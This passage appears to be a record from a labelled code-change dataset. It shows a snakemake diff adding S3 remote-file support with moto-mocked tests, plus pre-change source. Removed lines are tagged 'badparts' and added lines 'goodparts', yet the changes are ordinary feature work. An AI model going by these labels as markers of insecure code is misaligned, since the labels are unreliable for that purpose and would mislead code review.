self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        return k.exists(headers=headers)\n+\n+    def key_size(self, bucketName, key, headers=None):\n+        \"\"\" Returns the size of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                Size in kb\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        return k.size\n+\n+    def key_last_modified(self, bucketName, key, headers=None):\n+        \"\"\" Returns a timestamp of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                timestamp\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        # email.utils parsing of timestamp mirrors boto whereas\n+        # time.strptime() can have TZ issues due to DST\n+        modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+        epochTime = int(email.utils.mktime_tz(modified_tuple))\n+\n+        return epochTime\n+\n+    def list_keys(self, bucketName):\n+        return self.conn.get_bucket(bucketName).list()\ndiff --git a/snakemake/rules.py b/snakemake/rules.py\nindex 3608167..5324eeb 100644\n--- a/snakemake/rules.py\n+++ b/snakemake/rules.py\n@@ -95,7 +95,12 @@ def get_io(rule):\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     return None\n \ndiff --git a/snakemake/workflow.py b/snakemake/workflow.py\nindex b035bc3..833bd90 100644\n--- a/snakemake/workflow.py\n+++ b/snakemake/workflow.py\n@@ -23,7 +23,7 @@\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import update_config\n \ndiff --git a/tests/test_remote/S3Mocked.py b/tests/test_remote/S3Mocked.py\nnew file mode 100644\nindex 0000000..d8cc489\n--- /dev/null\n+++ b/tests/test_remote/S3Mocked.py\n@@ -0,0 +1,103 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os, sys\n+from contextlib import contextmanager\n+import pickle\n+import time\n+import threading\n+\n+# third-party\n+import boto\n+from moto import mock_s3\n+\n+# intra-module\n+from snakemake.remote_providers.S3 import RemoteObject as S3RemoteObject\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import decAllMethods\n+\n+def noop():\n+    pass\n+\n+def pickledMotoWrapper(func):\n+    \"\"\"\n+        This is a class decorator that in turn decorates all methods within\n+        a class to mock out boto calls with moto-simulated ones.\n+        Since the moto backends are not presistent across calls by default, \n+        the wrapper also pickles the bucket state after each function call,\n+        and restores it before execution. This way uploaded files are available\n+        for follow-on tasks. Since snakemake may execute with multiple threads\n+        it also waits for the pickled bucket state file to be available before\n+        loading it in. This is a hackey alternative to using proper locks,\n+        but works ok in practice.\n+    \"\"\"\n+    def wrapper_func(self, *args, **kwargs):\n+        motoContextFile = \"motoState.p\"\n+\n+        motoContext = mock_s3()\n+\n+        # load moto buckets from pickle\n+        if os.path.isfile(motoContextFile) and os.path.getsize(motoContextFile) > 0:\n+            with file_lock(motoContextFile):\n+                with open( motoContextFile, \"rb\" ) as f:\n+                    motoContext.backends[\"global\"].buckets = pickle.load( f )\n+\n+        motoContext.backends[\"global\"].reset = noop\n+\n+        mockedFunction = motoContext(func)\n+\n+        retval = mockedFunction(self, *args, **kwargs)\n+\n+        with file_lock(motoContextFile):\n+            with open( motoContextFile, \"wb\" ) as f:\n+                pickle.dump(motoContext.backends[\"global\"].buckets, f)\n+\n+        return retval\n+    return wrapper_func\n+\n+@decAllMethods(pickledMotoWrapper, prefix=None)\n+class RemoteObject(S3RemoteObject):\n+    \"\"\" \n+        This is a derivative of the S3 remote provider that mocks\n+        out boto-based S3 calls using the \"moto\" Python package.\n+        Only the initializer is different; it \"uploads\" the input \n+        test file to the moto-simulated bucket at the start.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        bucketName = 'test-remote-bucket'\n+        testFile = \"test.txt\"\n+\n+        conn = boto.connect_s3()\n+        if bucketName not in [b.name for b in conn.get_all_buckets()]:\n+            conn.create_bucket(bucketName)\n+\n+        # \"Upload\" files that should be in S3 before tests...\n+        s3c = S3Helper()\n+        if not s3c.exists_in_bucket(bucketName, testFile):\n+            s3c.upload_to_s3(bucketName, testFile)\n+\n+        return super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+\n+# ====== Helpers =====\n+\n+@contextmanager\n+def file_lock(filepath):\n+    lock_file = filepath + \".lock\"\n+\n+    while os.path.isfile(lock_file):\n+        time.sleep(0.1)\n+\n+    with open(lock_file, 'w') as f:\n+        f.write(\"1\")\n+\n+    try:\n+        yield\n+    finally:\n+        if os.path.isfile(lock_file):\n+            os.remove(lock_file)\n+\ndiff --git a/tests/test_remote/Snakefile b/tests/test_remote/Snakefile\nnew file mode 100644\nindex 0000000..b2e1298\n--- /dev/null\n+++ b/tests/test_remote/Snakefile\n@@ -0,0 +1,49 @@\n+import re, os, sys\n+\n+import S3Mocked as S3Mocked\n+\n+#remote dynamic file test\n+\n+# This makes use of a special provider that mocks up S3 using the moto\n+# library so that boto calls hit local \"buckets\"\n+\n+rule all:\n+    input:\n+        # only keeping the file so we can copy it out to the cwd\n+        remote(\"test-remote-bucket/out.txt\", keep=True, provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell(\"mv test-remote-bucket/out.txt ./\")\n+\n+rule split:\n+    input: remote('test-remote-bucket/test.txt', keep=False, provider=S3Mocked, additional_kwargs={})\n+    output: remote(dynamic('test-remote-bucket/prefix{split_id}.txt'), provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell('split -l 2 {input} test-remote-bucket/prefix')\n+        for f in os.listdir(os.getcwd()+\"/test-remote-bucket\"):\n+            if re.search('prefix[a-z][a-z]', f):\n+                os.rename(\"test-remote-bucket/\"+f, \"test-remote-bucket/\"+f + '.txt')\n+\n+rule cut:\n+    input: remote('test-remote-bucket/prefix{split_id,[a-z][a-z]}.txt', provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket/{split_id}_cut.txt', provider=S3Mocked, additional_kwargs={})\n+    shell: 'cut -f 1,2 {input} > {output}'\n+\n+rule merge:\n+    input: \n+        remote(dynamic('test-remote-bucket/{split_id}_cut.txt'), provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket/out.txt', provider=S3Mocked, additional_kwargs={}),\n+    run: \n+        shell('echo {input}; cat {input} > {output}')\n+\n+\n+# after we finish, we need to remove the pickle storing\n+# the local moto \"buckets\" so we are starting fresh\n+# next time this test is run. This file is created by\n+# the moto wrapper defined in S3Mocked.py\n+onsuccess:\n+    shell(\"rm ./motoState.p\")\n+\n+onerror:\n+    shell(\"rm ./motoState.p\")\n\\ No newline at end of file\ndiff --git a/tests/test_benchmark/expected-results/test.benchmark.json b/tests/test_remote/__init__.py\nsimilarity index 100%\nrename from tests/test_benchmark/expected-results/test.benchmark.json\nrename to tests/test_remote/__init__.py\ndiff --git a/tests/test_remote/expected-results/out.txt b/tests/test_remote/expected-results/out.txt\nnew file mode 100644\nindex 0000000..818b3c5\n--- /dev/null\n+++ b/tests/test_remote/expected-results/out.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a/tests/test_remote/test.txt b/tests/test_remote/test.txt\nnew file mode 100644\nindex 0000000..818b3c5\n--- /dev/null\n+++ b/tests/test_remote/test.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a/tests/tests.py b/tests/tests.py\nold mode 100644\nnew mode 100755\nindex 37dd180..6b53573\n--- a/tests/tests.py\n+++ b/tests/tests.py\n@@ -265,6 +265,9 @@ def test_multiple_includes():\n def test_yaml_config():\n     run(dpath(\"test_yaml_config\"))\n \n+def test_remote():\n+   run(dpath(\"test_remote\"))\n+\n \n def test_cluster_sync():\n     run(dpath(\"test14\"),\n", "files": {"/snakemake/dag.py": {"changes": [{"diff": "\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n", "add": 1, "remove": 1, "filename": "/snakemake/dag.py", "badparts": ["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files"], "goodparts": ["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged"]}]}, "/snakemake/io.py": {"changes": [{"diff": "\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n", "add": 3, "remove": 2, "filename": "/snakemake/io.py", "badparts": ["from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError"], "goodparts": ["import functools", "from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException", "import snakemake.remote_providers.S3 as S3"]}, {"diff": "\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n", "add": 45, "remove": 3, "filename": "/snakemake/io.py", "badparts": ["    def protected(self):", "        return self.exists and not os.access(self.file, os.W_OK)", "        if not self.exists and lstat(self.file):"], "goodparts": ["    @_referToRemote", "    def exists_local(self):", "        return os.path.exists(self.file)", "    @property", "    def exists_remote(self):", "        return (self.is_remote and self.remote_object.exists())", "    def protected(self):", "        return self.exists_local and not os.access(self.file, os.W_OK)", "    @property", "    @_referToRemote", "        return lstat(self.file).st_mtime", "    @property", "    def flags(self):", "        return getattr(self._file, \"flags\", {})", "    @property", "    def mtime_local(self):", "    @_referToRemote", "    @property", "    def size_local(self):", "        self.check_broken_symlink()", "        return os.path.getsize(self.file)", "        if not self.exists_local and lstat(self.file):", "    def download_from_remote(self):", "        logger.info(\"Downloading from remote: {}\".format(self.file))", "        if self.is_remote and self.remote_object.exists():", "            self.remote_object.download()", "        else:", "            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")", "    def upload_to_remote(self):", "        logger.info(\"Uploading to remote: {}\".format(self.file))", "        if self.is_remote and not self.remote_object.exists():", "            self.remote_object.upload()", "        else:", "            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")"]}, {"diff": "\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n", "add": 3, "remove": 2, "filename": "/snakemake/io.py", "badparts": ["    def touch(self):", "            lutime(self.file, None)"], "goodparts": ["    def touch(self, times=None):", "        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"", "            lutime(self.file, times)"]}, {"diff": "\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n", "add": 12, "remove": 2, "filename": "/snakemake/io.py", "badparts": ["        return IOFile(apply_wildcards(f, wildcards,", "                      rule=self.rule)"], "goodparts": ["        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})", "        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,", "                                      rule=self.rule)", "        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))", "        return fileWithWildcardsApplied"]}, {"diff": "\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n", "add": 9, "remove": 1, "filename": "/snakemake/io.py", "badparts": ["        return flag in value.flags"], "goodparts": ["        return flag in value.flags and value.flags[flag]", "    if isinstance(value, _IOFile):", "        return flag in value.flags and value.flags[flag]", "def get_flag_value(value, flag_type):", "    if isinstance(value, AnnotatedString):", "        if flag_type in value.flags:", "            return value.flags[flag_type]", "        else:", "            return None"]}, {"diff": "\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n", "add": 1, "remove": 1, "filename": "/snakemake/io.py", "badparts": ["    annotated = flag(value, \"dynamic\")"], "goodparts": ["    annotated = flag(value, \"dynamic\", True)"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import stat import time import json from itertools import product, chain from collections import Iterable, namedtuple from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError from snakemake.logging import logger def lstat(f): return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks) def lutime(f, times): return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks) def lchmod(f, mode): return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks) def IOFile(file, rule=None): f=_IOFile(file) f.rule=rule return f class _IOFile(str): \"\"\" A file that is either input or output of a rule. \"\"\" dynamic_fill=\"__snakemake_dynamic__\" def __new__(cls, file): obj=str.__new__(cls, file) obj._is_function=type(file).__name__==\"function\" obj._file=file obj.rule=None obj._regex=None return obj @property def file(self): if not self._is_function: return self._file else: raise ValueError(\"This IOFile is specified as a function and \" \"may not be used directly.\") @property def exists(self): return os.path.exists(self.file) @property def protected(self): return self.exists and not os.access(self.file, os.W_OK) @property def mtime(self): return lstat(self.file).st_mtime @property def size(self): self.check_broken_symlink() return os.path.getsize(self.file) def check_broken_symlink(self): \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\" if not self.exists and lstat(self.file): raise WorkflowError(\"File{} seems to be a broken symlink.\".format(self.file)) def is_newer(self, time): return self.mtime > time def prepare(self): path_until_wildcard=re.split(self.dynamic_fill, self.file)[0] dir=os.path.dirname(path_until_wildcard) if len(dir) > 0 and not os.path.exists(dir): try: os.makedirs(dir) except OSError as e: if e.errno !=17: raise e def protect(self): mode=(lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~ stat.S_IWOTH) if os.path.isdir(self.file): for root, dirs, files in os.walk(self.file): for d in dirs: lchmod(os.path.join(self.file, d), mode) for f in files: lchmod(os.path.join(self.file, f), mode) else: lchmod(self.file, mode) def remove(self): remove(self.file) def touch(self): try: lutime(self.file, None) except OSError as e: if e.errno==2: raise MissingOutputException( \"Output file{} of rule{} shall be touched but \" \"does not exist.\".format(self.file, self.rule.name), lineno=self.rule.lineno, snakefile=self.rule.snakefile) else: raise e def touch_or_create(self): try: self.touch() except MissingOutputException: with open(self.file, \"w\") as f: pass def apply_wildcards(self, wildcards, fill_missing=False, fail_dynamic=False): f=self._file if self._is_function: f=self._file(Namedlist(fromdict=wildcards)) return IOFile(apply_wildcards(f, wildcards, fill_missing=fill_missing, fail_dynamic=fail_dynamic, dynamic_fill=self.dynamic_fill), rule=self.rule) def get_wildcard_names(self): return get_wildcard_names(self.file) def contains_wildcard(self): return contains_wildcard(self.file) def regex(self): if self._regex is None: self._regex=re.compile(regex(self.file)) return self._regex def constant_prefix(self): first_wildcard=_wildcard_regex.search(self.file) if first_wildcard: return self.file[:first_wildcard.start()] return self.file def match(self, target): return self.regex().match(target) or None def format_dynamic(self): return self.replace(self.dynamic_fill, \"{*}\") def __eq__(self, other): f=other._file if isinstance(other, _IOFile) else other return self._file==f def __hash__(self): return self._file.__hash__() _wildcard_regex=re.compile( \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\") def wait_for_files(files, latency_wait=3): \"\"\"Wait for given files to be present in filesystem.\"\"\" files=list(files) get_missing=lambda:[f for f in files if not os.path.exists(f)] missing=get_missing() if missing: logger.info(\"Waiting at most{} seconds for missing files.\".format( latency_wait)) for _ in range(latency_wait): if not get_missing(): return time.sleep(1) raise IOError(\"Missing files after{} seconds:\\n{}\".format( latency_wait, \"\\n\".join(get_missing()))) def get_wildcard_names(pattern): return set(match.group('name') for match in _wildcard_regex.finditer(pattern)) def contains_wildcard(path): return _wildcard_regex.search(path) is not None def remove(file): if os.path.exists(file): if os.path.isdir(file): try: os.removedirs(file) except OSError: pass else: os.remove(file) def regex(filepattern): f=[] last=0 wildcards=set() for match in _wildcard_regex.finditer(filepattern): f.append(re.escape(filepattern[last:match.start()])) wildcard=match.group(\"name\") if wildcard in wildcards: if match.group(\"constraint\"): raise ValueError( \"If multiple wildcards of the same name \" \"appear in a string, eventual constraints have to be defined \" \"at the first occurence and will be inherited by the others.\") f.append(\"(?P={})\".format(wildcard)) else: wildcards.add(wildcard) f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if match.group(\"constraint\") else \".+\")) last=match.end() f.append(re.escape(filepattern[last:])) f.append(\"$\") return \"\".join(f) def apply_wildcards(pattern, wildcards, fill_missing=False, fail_dynamic=False, dynamic_fill=None, keep_dynamic=False): def format_match(match): name=match.group(\"name\") try: value=wildcards[name] if fail_dynamic and value==dynamic_fill: raise WildcardError(name) return str(value) except KeyError as ex: if keep_dynamic: return \"{{{}}}\".format(name) elif fill_missing: return dynamic_fill else: raise WildcardError(str(ex)) return re.sub(_wildcard_regex, format_match, pattern) def not_iterable(value): return isinstance(value, str) or not isinstance(value, Iterable) class AnnotatedString(str): def __init__(self, value): self.flags=dict() def flag(value, flag_type, flag_value=True): if isinstance(value, AnnotatedString): value.flags[flag_type]=flag_value return value if not_iterable(value): value=AnnotatedString(value) value.flags[flag_type]=flag_value return value return[flag(v, flag_type, flag_value=flag_value) for v in value] def is_flagged(value, flag): if isinstance(value, AnnotatedString): return flag in value.flags return False def temp(value): \"\"\" A flag for an input or output file that shall be removed after usage. \"\"\" if is_flagged(value, \"protected\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"temp\") def temporary(value): \"\"\" An alias for temp. \"\"\" return temp(value) def protected(value): \"\"\" A flag for a file that shall be write protected after creation. \"\"\" if is_flagged(value, \"temp\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"protected\") def dynamic(value): \"\"\" A flag for a file that shall be dynamic, i.e. the multiplicity (and wildcard values) will be expanded after a certain rule has been run \"\"\" annotated=flag(value, \"dynamic\") tocheck=[annotated] if not_iterable(annotated) else annotated for file in tocheck: matches=list(_wildcard_regex.finditer(file)) for match in matches: if match.group(\"constraint\"): raise SyntaxError( \"The wildcards in dynamic files cannot be constrained.\") return annotated def touch(value): return flag(value, \"touch\") def expand(*args, **wildcards): \"\"\" Expand wildcards in given filepatterns. Arguments *args --first arg: filepatterns as list or one single filepattern, second arg(optional): a function to combine wildcard values (itertools.product per default) **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" filepatterns=args[0] if len(args)==1: combinator=product elif len(args)==2: combinator=args[1] if isinstance(filepatterns, str): filepatterns=[filepatterns] def flatten(wildcards): for wildcard, values in wildcards.items(): if isinstance(values, str) or not isinstance(values, Iterable): values=[values] yield[(wildcard, value) for value in values] try: return[filepattern.format(**comb) for comb in map(dict, combinator(*flatten(wildcards))) for filepattern in filepatterns] except KeyError as e: raise WildcardError(\"No values given for wildcard{}.\".format(e)) def limit(pattern, **wildcards): \"\"\" Limit wildcards to the given values. Arguments: **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" return pattern.format(**{ wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values)) for wildcard, values in wildcards.items() }) def glob_wildcards(pattern): \"\"\" Glob the values of the wildcards by matching the given pattern to the filesystem. Returns a named tuple with a list of values for each wildcard. \"\"\" pattern=os.path.normpath(pattern) first_wildcard=re.search(\"{[^{]\", pattern) dirname=os.path.dirname(pattern[:first_wildcard.start( )]) if first_wildcard else os.path.dirname(pattern) if not dirname: dirname=\".\" names=[match.group('name') for match in _wildcard_regex.finditer(pattern)] Wildcards=namedtuple(\"Wildcards\", names) wildcards=Wildcards(*[list() for name in names]) pattern=re.compile(regex(pattern)) for dirpath, dirnames, filenames in os.walk(dirname): for f in chain(filenames, dirnames): if dirpath !=\".\": f=os.path.join(dirpath, f) match=re.match(pattern, f) if match: for name, value in match.groupdict().items(): getattr(wildcards, name).append(value) return wildcards class Namedlist(list): \"\"\" A list that additionally provides functions to name items. Further, it is hashable, however the hash does not consider the item names. \"\"\" def __init__(self, toclone=None, fromdict=None, plainstr=False): \"\"\" Create the object. Arguments toclone --another Namedlist that shall be cloned fromdict --a dict that shall be converted to a Namedlist(keys become names) \"\"\" list.__init__(self) self._names=dict() if toclone: self.extend(map(str, toclone) if plainstr else toclone) if isinstance(toclone, Namedlist): self.take_names(toclone.get_names()) if fromdict: for key, item in fromdict.items(): self.append(item) self.add_name(key) def add_name(self, name): \"\"\" Add a name to the last item. Arguments name --a name \"\"\" self.set_name(name, len(self) -1) def set_name(self, name, index, end=None): \"\"\" Set the name of an item. Arguments name --a name index --the item index \"\"\" self._names[name]=(index, end) if end is None: setattr(self, name, self[index]) else: setattr(self, name, Namedlist(toclone=self[index:end])) def get_names(self): \"\"\" Get the defined names as(name, index) pairs. \"\"\" for name, index in self._names.items(): yield name, index def take_names(self, names): \"\"\" Take over the given names. Arguments names --the given names as(name, index) pairs \"\"\" for name,(i, j) in names: self.set_name(name, i, end=j) def items(self): for name in self._names: yield name, getattr(self, name) def allitems(self): next=0 for name, index in sorted(self._names.items(), key=lambda item: item[1][0]): start, end=index if end is None: end=start +1 if start > next: for item in self[next:start]: yield None, item yield name, getattr(self, name) next=end for item in self[next:]: yield None, item def insert_items(self, index, items): self[index:index +1]=items add=len(items) -1 for name,(i, j) in self._names.items(): if i > index: self._names[name]=(i +add, j +add) elif i==index: self.set_name(name, i, end=i +len(items)) def keys(self): return self._names def plainstrings(self): return self.__class__.__call__(toclone=self, plainstr=True) def __getitem__(self, key): try: return super().__getitem__(key) except TypeError: pass return getattr(self, key) def __hash__(self): return hash(tuple(self)) def __str__(self): return \" \".join(map(str, self)) class InputFiles(Namedlist): pass class OutputFiles(Namedlist): pass class Wildcards(Namedlist): pass class Params(Namedlist): pass class Resources(Namedlist): pass class Log(Namedlist): pass def _load_configfile(configpath): \"Tries to load a configfile first as JSON, then as YAML, into a dict.\" try: with open(configpath) as f: try: return json.load(f) except ValueError: f.seek(0) try: import yaml except ImportError: raise WorkflowError(\"Config file is not valid JSON and PyYAML \" \"has not been installed. Please install \" \"PyYAML to use YAML config files.\") try: return yaml.load(f) except yaml.YAMLError: raise WorkflowError(\"Config file is not valid JSON or YAML.\") except FileNotFoundError: raise WorkflowError(\"Config file{} not found.\".format(configpath)) def load_configfile(configpath): \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\" config=_load_configfile(configpath) if not isinstance(config, dict): raise WorkflowError(\"Config file must be given as JSON or YAML \" \"with keys at top level.\") return config class PeriodicityDetector: def __init__(self, min_repeat=50, max_repeat=100): \"\"\" Args: max_len(int): The maximum length of the periodic substring. \"\"\" self.regex=re.compile( \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format( min_repeat=min_repeat -1, max_repeat=max_repeat -1)) def is_periodic(self, value): \"\"\"Returns the periodic substring or None if not periodic.\"\"\" m=self.regex.search(value) if m is not None: return m.group(\"value\") ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport stat\nimport time\nimport json\nfrom itertools import product, chain\nfrom collections import Iterable, namedtuple\nfrom snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\nfrom snakemake.logging import logger\n\n\ndef lstat(f):\n    return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n\n\ndef lutime(f, times):\n    return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks)\n\n\ndef lchmod(f, mode):\n    return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks)\n\n\ndef IOFile(file, rule=None):\n    f = _IOFile(file)\n    f.rule = rule\n    return f\n\n\nclass _IOFile(str):\n    \"\"\"\n    A file that is either input or output of a rule.\n    \"\"\"\n\n    dynamic_fill = \"__snakemake_dynamic__\"\n\n    def __new__(cls, file):\n        obj = str.__new__(cls, file)\n        obj._is_function = type(file).__name__ == \"function\"\n        obj._file = file\n        obj.rule = None\n        obj._regex = None\n        return obj\n\n    @property\n    def file(self):\n        if not self._is_function:\n            return self._file\n        else:\n            raise ValueError(\"This IOFile is specified as a function and \"\n                             \"may not be used directly.\")\n\n    @property\n    def exists(self):\n        return os.path.exists(self.file)\n\n    @property\n    def protected(self):\n        return self.exists and not os.access(self.file, os.W_OK)\n\n    @property\n    def mtime(self):\n        # do not follow symlinks for modification time\n        return lstat(self.file).st_mtime\n\n    @property\n    def size(self):\n        # follow symlinks but throw error if invalid\n        self.check_broken_symlink()\n        return os.path.getsize(self.file)\n\n    def check_broken_symlink(self):\n        \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n        if not self.exists and lstat(self.file):\n            raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n\n    def is_newer(self, time):\n        return self.mtime > time\n\n    def prepare(self):\n        path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n        dir = 